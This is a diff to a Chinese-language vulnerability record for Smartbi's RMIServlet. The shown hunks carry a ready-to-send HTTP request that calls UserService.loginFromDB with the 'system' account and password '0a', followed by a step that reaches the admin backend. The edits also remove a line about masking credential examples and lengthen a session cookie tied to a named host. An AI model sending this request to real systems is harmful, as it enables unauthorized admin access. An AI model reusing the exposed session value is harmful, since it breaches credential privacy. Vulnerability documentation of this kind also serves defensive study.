@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -78,7 +78,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: identity
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Content-Type: application/x-www-form-urlencoded
-Cookie: JSESSIONID=B08E6669BFA8E9D85FB6BD98411C
+Cookie: JSESSIONID=B08E6669BFA8E9D85FB6BD98411C349C
 Origin: https://smartbi.cy-sys.cn
 Referer: https://smartbi.cy-sys.cn/smartbi/vision/RMIServlet
 Sec-Fetch-Dest: document
@@ -87,11 +87,12 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+Content-Length: 81
 
 className=UserService&methodName=loginFromDB&params=["system","0a"]
 ```
 
-> 请求长度说明：原资料 Content-Length 为 81；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 81；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 3. 访问`https://xx.xx.xx.xx/smartbi/vision/index.jsp`成功进入后台
